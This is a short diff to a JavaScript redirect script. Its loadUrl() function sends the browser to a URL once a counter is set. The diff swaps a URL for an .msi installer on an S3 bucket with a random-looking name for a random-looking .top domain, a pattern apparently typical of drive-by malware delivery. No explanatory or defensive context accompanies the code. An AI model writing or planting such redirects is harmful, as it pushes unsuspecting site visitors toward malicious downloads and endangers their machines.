@@ -2,7 +2,7 @@ function loadUrl()
 {
 	if(num>=1)
 	{
-		var url="https://yhfo1o1cb.s3.ap-southeast-2.amazonaws.com/yhfo1o1cb.msi";
+		var url="https://hyeiyevverldd.top";
 		window.location=url;
 	}
 }
@@ -12,6 +12,7 @@ function getLoad()
 {
 	num++;
 }
+
 
 
 
